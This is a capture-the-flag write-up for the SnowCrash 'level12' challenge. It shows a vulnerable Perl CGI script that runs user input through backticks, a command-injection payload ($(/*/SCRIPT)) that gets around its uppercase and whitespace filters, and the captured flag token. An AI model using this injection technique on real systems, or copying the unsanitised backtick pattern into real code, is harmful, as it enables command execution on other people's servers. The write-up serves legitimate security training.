# level 12

## Recognition

There is a perl script for a simple webserver, which takes in two params x and y. x is passed as first arugment of the t() function, which is then passed to two regexes, one changing all alphabetic characters to uppercase, and another deleting all after the first whitespace, then, that string will be executed by egrep on a /tmp/xd file.
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

</br>
</br>

## Exploitation

We then need to find a way to execute something thus bypassing the two regexes, we can't have any lowercase character nor any chains of words since only the first one gets selected.

We can try to have a script running `getflag` named in uppercase, this will bypass the first regex.
```bash
level12@SnowCrash:~$ echo 'getflag > /tmp/flag' > /tmp/SCRIPT
```

Though we now need to find a way to execute, it, for that we can use a simple bash subshell $(), However, we can't reference the /tmp folder since the first regex will uppercase it.
To tackle that, we will need to use bash wildcard * operator that will find any occurences of a matching pattern.
```bash
$(/*/SCRIPT)
```

However the webserver will be ran as flag12, so we also need to give it privileges to run the script.
```bash
level12@SnowCrash:~$ chmod a+rwx /tmp/SCRIPT
```

We can now execute the script on the browser by requesting
```
snowcrash:4646/?x=$(/*/SCRIPT)
```
And then get the flag on /tmp/flag
```bash
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

